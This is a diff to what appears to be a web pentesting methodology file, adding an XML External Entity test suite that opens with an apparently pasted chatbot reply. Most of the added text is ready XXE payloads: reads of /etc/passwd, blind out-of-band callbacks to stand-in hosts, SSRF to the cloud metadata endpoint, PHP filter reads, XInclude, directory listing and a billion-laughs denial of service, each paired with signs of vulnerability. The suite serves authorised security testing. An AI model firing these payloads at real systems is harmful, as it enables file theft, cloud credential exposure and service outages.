@@ -4382,6 +4382,127 @@ http://10.10.10.10/cat/accountsid=1
 <iframe src="http://bing.com" height="100%" width="100%"></iframe>
 ```
 
+Absolutely, Anvesh — here's a **modular XXE test suite** tailored for your GitHub methodology, with additional edge cases and automation-ready payloads. Each test includes expected behavior and signs of vulnerability.
+
+---
+
+## 🧬 XML External Entity (XXE) Injection Test Suite
+
+### 1. Basic External Entity Injection  
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+✅ Expected: External entities disabled  
+❌ Vulnerable: File contents returned
+
+---
+
+### 2. Blind XXE via Out-of-Band DNS  
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://yourdomain.burpcollaborator.net"> %xxe; ]>
+<stockCheck><productId>123</productId></stockCheck>
+```
+
+✅ Expected: No DNS resolution  
+❌ Vulnerable: DNS ping received
+
+---
+
+### 3. SSRF via Metadata Service  
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+✅ Expected: Internal IPs blocked  
+❌ Vulnerable: Metadata returned
+
+---
+
+### 4. Base64 File Read via PHP Filter  
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<data>&xxe;</data>
+```
+
+✅ Expected: Filter blocked  
+❌ Vulnerable: Encoded file contents returned
+
+---
+
+### 5. Parameter Entity for Blind XXE  
+```xml
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://yourdomain.com"> %xxe; ]>
+<stockCheck><productId>3</productId></stockCheck>
+```
+
+✅ Expected: Parameter entities disabled  
+❌ Vulnerable: OOB interaction triggered
+
+---
+
+### 6. Billion Laughs DoS  
+```xml
+<!DOCTYPE lolz [
+  <!ENTITY a0 "LOL">
+  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+]>
+<data>&a3;</data>
+```
+
+✅ Expected: Entity expansion limits enforced  
+❌ Vulnerable: Parser crash or hang
+
+---
+
+### 7. XInclude Injection  
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+✅ Expected: XInclude disabled  
+❌ Vulnerable: File contents included
+
+---
+
+### 8. Directory Listing via Entity  
+```xml
+<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/"> ]>
+<root><foo>&xxe;</foo></root>
+```
+
+✅ Expected: Directory access blocked  
+❌ Vulnerable: Directory contents listed
+
+---
+
+### 9. XXE Inside DOCX/SVG  
+Embed payloads in file formats that use XML internally.
+
+✅ Expected: Secure parsing of embedded XML  
+❌ Vulnerable: XXE triggered via file upload
+
+---
+
+### 10. Content-Type Mismatch  
+Send XML with incorrect `Content-Type`.
+
+```http
+POST /api/xml
+Content-Type: application/json
+
+<?xml version="1.0"?><foo>&xxe;</foo>
+```
+
+✅ Expected: Parser rejects mismatched content  
+❌ Vulnerable: XML parsed despite header
+
 ---
 
 # CSV Injection (Formula Injection)
